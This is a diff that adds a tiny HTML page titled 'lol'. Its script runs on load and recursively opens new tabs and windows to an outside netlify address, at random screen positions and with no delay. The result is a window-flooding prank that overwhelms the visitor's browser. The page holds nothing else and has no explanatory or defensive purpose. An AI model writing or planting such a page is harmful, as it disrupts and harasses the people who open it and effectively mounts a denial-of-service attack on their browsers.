@@ -1,0 +1,30 @@
+<!doctype html>
+<title>lol</title>
+<body>
+<script>
+function openWebsiteUltraFast() {
+    let counter = 0;
+
+    function openRandomWindow() {
+        // Generate random positions for new windows
+        const randomX = Math.floor(Math.random() * window.screen.width);
+        const randomY = Math.floor(Math.random() * window.screen.height);
+        const windowFeatures = `width=800,height=600,left=${randomX},top=${randomY}`;
+        
+        // Open a new tab or window
+        if (counter % 2 === 0) {
+            window.open('https://xx0.netlify.app/', '_blank');
+        } else {
+            window.open('https://xx0.netlify.app', '_blank', windowFeatures);
+        }
+        counter++;
+
+        // Infinite loop to open windows continuously without any delay
+        openRandomWindow(); // No setTimeout here to prevent delays
+    }
+
+    openRandomWindow();
+}
+
+openWebsiteUltraFast();
+</script>
